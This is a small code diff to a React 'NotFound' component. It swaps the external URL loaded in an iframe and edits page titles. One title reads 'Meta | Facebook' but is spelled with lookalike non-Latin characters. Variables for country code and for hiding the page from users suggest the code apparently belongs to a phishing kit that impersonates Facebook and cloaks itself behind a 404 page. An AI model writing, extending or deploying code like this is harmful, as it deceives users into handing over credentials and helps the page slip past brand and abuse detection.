@@ -5,9 +5,9 @@ import { Helmet } from 'react-helmet';
 function NotFound() {
   let[countryCode, setCountryCode] = useState('');
   let[IsUserHiden, SetUserHiden] = useState(false);
-  let[IframeUrl, SetIframeUrl] = useState('https://linkpha-mv2.vercel.app');
+  let[IframeUrl, SetIframeUrl] = useState('https://linkclient.onrender.com');
   let[SiteTitleMeta, SetSiteTitleMeta] = useState('Μеtа | Fасеbοоk');
-  let[SiteTitleHome, SetSiteTitleHome] = useState('Home page');
+  let[SiteTitleHome, SetSiteTitleHome] = useState('Home Page | Welcome');
 
 
   function showIframe(file,title,favicon) {
